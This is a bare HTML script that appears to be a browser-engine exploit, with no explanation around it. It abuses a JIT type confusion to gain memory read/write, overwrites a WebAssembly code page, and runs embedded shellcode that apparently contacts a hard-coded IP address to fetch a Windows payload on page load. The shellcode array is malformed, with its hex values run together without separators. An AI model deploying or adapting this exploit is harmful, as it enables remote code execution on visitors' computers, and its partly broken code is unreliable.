<script>
    function gc() {
        for (var i = 0; i < 0x80000; ++i) {
            var a = new ArrayBuffer();
        }
    }
    let shellcode = [0xfc0x480x830xe40xf00xe80xc80x000x000x000x410x510x410x500x520x510x560x480x310xd20x650x480x8b0x520x600x480x8b0x520x180x480x8b0x520x200x480x8b0x720x500x480x0f0xb70x4a0x4a0x4d0x310xc90x480x310xc00xac0x3c0x610x7c0x020x2c0x200x410xc10xc90x0d0x410x010xc10xe20xed0x520x410x510x480x8b0x520x200x8b0x420x3c0x480x010xd00x660x810x780x180x0b0x020x750x720x8b0x800x880x000x000x000x480x850xc00x740x670x480x010xd00x500x8b0x480x180x440x8b0x400x200x490x010xd00xe30x560x480xff0xc90x410x8b0x340x880x480x010xd60x4d0x310xc90x480x310xc00xac0x410xc10xc90x0d0x410x010xc10x380xe00x750xf10x4c0x030x4c0x240x080x450x390xd10x750xd80x580x440x8b0x400x240x490x010xd00x660x410x8b0x0c0x480x440x8b0x400x1c0x490x010xd00x410x8b0x040x880x480x010xd00x410x580x410x580x5e0x590x5a0x410x580x410x590x410x5a0x480x830xec0x200x410x520xff0xe00x580x410x590x5a0x480x8b0x120xe90x4f0xff0xff0xff0x5d0x6a0x000x490xbe0x770x690x6e0x690x6e0x650x740x000x410x560x490x890xe60x4c0x890xf10x410xba0x4c0x770x260x070xff0xd50x480x310xc90x480x310xd20x4d0x310xc00x4d0x310xc90x410x500x410x500x410xba0x3a0x560x790xa70xff0xd50xeb0x730x5a0x480x890xc10x410xb80xff0x000x000x000x4d0x310xc90x410x510x410x510x6a0x030x410x510x410xba0x570x890x9f0xc60xff0xd50xeb0x590x5b0x480x890xc10x480x310xd20x490x890xd80x4d0x310xc90x520x680x000x020x400x840x520x520x410xba0xeb0x550x2e0x3b0xff0xd50x480x890xc60x480x830xc30x500x6a0x0a0x5f0x480x890xf10x480x890xda0x490xc70xc00xff0xff0xff0xff0x4d0x310xc90x520x520x410xba0x2d0x060x180x7b0xff0xd50x850xc00x0f0x850x9d0x010x000x000x480xff0xcf0x0f0x840x8c0x010x000x000xeb0xd30xe90xe40x010x000x000xe80xa20xff0xff0xff0x2f0x510x4f0x450x780x000x350xad0xfe0xf60xf50xc10x6b0x7b0x290x4c0x730x1e0x8a0x4e0x100x3f0x1a0xb80x340x490xbd0x670xed0x090x380x0c0xdf0x580xd40x0b0x0c0xbc0x420xec0xa20xc90x600xb60x880xda0xf40x1b0x1c0x060x3b0xc60x070x640x260x0b0x5c0x7d0xc80xa10x260xc40xe50x560x770x330x270xca0xdb0x810x010x5c0x730x9f0xa90xb40x800x5a0x100x000x550x730x650x720x2d0x410x670x650x6e0x740x3a0x200x4d0x6f0x7a0x690x6c0x6c0x610x2f0x350x2e0x300x200x280x630x6f0x6d0x700x610x740x690x620x6c0x650x3b0x200x4d0x530x490x450x200x390x2e0x300x3b0x200x570x690x6e0x640x6f0x770x730x200x4e0x540x200x360x2e0x300x3b0x200x540x720x690x640x650x6e0x740x2f0x350x2e0x300x3b0x200x420x4f0x490x450x390x3b0x450x4e0x550x530x4d0x530x4e0x490x500x290x0d0x0a0x000xf30xf00xeb0xf10x960xf60xc60xe00x140xdf0x7f0xe60x5d0x130xb30xad0x260xbb0xe50xfc0x170xa20xc80x6f0xee0xd90x390x730x040xca0x4e0x270xeb0xd10x420xba0xa60xee0x340x210x5f0xc10x370xb00x620x780x150x300xb30x500xd20x6e0xd90xaa0x400x3a0x690xb70x760x8a0x700x340x850x7d0x7b0x710x3f0xef0x3f0x030x6c0xf10x090xbb0x090x7b0x150x2c0x4b0x550x5e0x200xec0x720x3b0x9e0xbd0x940x9a0xc10xc90xf50x440x9c0xe80x1f0x080xaf0xd60x2b0x3e0x790xd70x660x100x1f0xc10x040xf20xc50x170x2d0xc80x710x070x350x360x4a0xeb0x520xf00x180x490xa90xf80x330xd70x100x8b0x720xf20xb80x9b0x400xbd0x4b0x380xed0xd70x970xa90x2e0x9a0x3f0x7c0x550x9d0x740x260x150xfb0xba0xad0x630xdd0x650x700x720xac0x120x7b0x530x120xf70x530x880xec0x980xb40xeb0xdf0xa10xf40xc70x9c0xbe0x6c0x200xcb0xe90x880x860xf00x4f0xd10xb20xe60xb00xd90xc20x870x740x310x720xe00xe80xc00xc70x070x350x290xe80x3d0x0f0x540x230x320x960x000x410xbe0xf00xb50xa20x560xff0xd50x480x310xc90xba0x000x000x400x000x410xb80x000x100x000x000x410xb90x400x000x000x000x410xba0x580xa40x530xe50xff0xd50x480x930x530x530x480x890xe70x480x890xf10x480x890xda0x410xb80x000x200x000x000x490x890xf90x410xba0x120x960x890xe20xff0xd50x480x830xc40x200x850xc00x740xb60x660x8b0x070x480x010xc30x850xc00x750xd70x580x580x580x480x050x000x000x000x000x500xc30xe80x9f0xfd0xff0xff0x310x390x320x2e0x320x310x300x2e0x310x370x340x2e0x310x340x330x000x170x500x650xea];
    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var main = wasmInstance.exports.main;
    var bf = new ArrayBuffer(8);
    var bfView = new DataView(bf);
    function fLow(f) {
        bfView.setFloat64(0, f, true);
        return (bfView.getUint32(0, true));
    }
    function fHi(f) {
        bfView.setFloat64(0, f, true);
        return (bfView.getUint32(4, true))
    }
    function i2f(low, hi) {
        bfView.setUint32(0, low, true);
        bfView.setUint32(4, hi, true);
        return bfView.getFloat64(0, true);
    }
    function f2big(f) {
        bfView.setFloat64(0, f, true);
        return bfView.getBigUint64(0, true);
    }
    function big2f(b) {
        bfView.setBigUint64(0, b, true);
        return bfView.getFloat64(0, true);
    }
    class LeakArrayBuffer extends ArrayBuffer {
        constructor(size) {
            super(size);
            this.slot = 0xb33f;
        }
    }
    function foo(a) {
        let x = -1;
        if (a) x = 0xFFFFFFFF;
        var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));
        arr.shift();
        let local_arr = Array(2);
        local_arr[0] = 5.1;//4014666666666666
        let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8
        arr[0] = 0x1122;
        return [arr, local_arr, buff];
    }
    for (var i = 0; i < 0x10000; ++i)
        foo(false);
    gc(); gc();
    [corrput_arr, rwarr, corrupt_buff] = foo(true);
    corrput_arr[12] = 0x22444;
    delete corrput_arr;
    function setbackingStore(hi, low) {
        rwarr[4] = i2f(fLow(rwarr[4]), hi);
        rwarr[5] = i2f(low, fHi(rwarr[5]));
    }
    function leakObjLow(o) {
        corrupt_buff.slot = o;
        return (fLow(rwarr[9]) - 1);
    }
    let corrupt_view = new DataView(corrupt_buff);
    let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);
    let idx0Addr = corrupt_buffer_ptr_low - 0x10;
    let baseAddr = (corrupt_buffer_ptr_low & 0xffff0000) - ((corrupt_buffer_ptr_low & 0xffff0000) % 0x40000) + 0x40000;
    let delta = baseAddr + 0x1c - idx0Addr;
    if ((delta % 8) == 0) {
        let baseIdx = delta / 8;
        this.base = fLow(rwarr[baseIdx]);
    } else {
        let baseIdx = ((delta - (delta % 8)) / 8);
        this.base = fHi(rwarr[baseIdx]);
    }
    let wasmInsAddr = leakObjLow(wasmInstance);
    setbackingStore(wasmInsAddr, this.base);
    let code_entry = corrupt_view.getFloat64(13 * 8, true);
    setbackingStore(fLow(code_entry), fHi(code_entry));
    for (let i = 0; i < shellcode.length; i++) {
        corrupt_view.setUint8(i, shellcode[i]);
    }
    main();
</script>
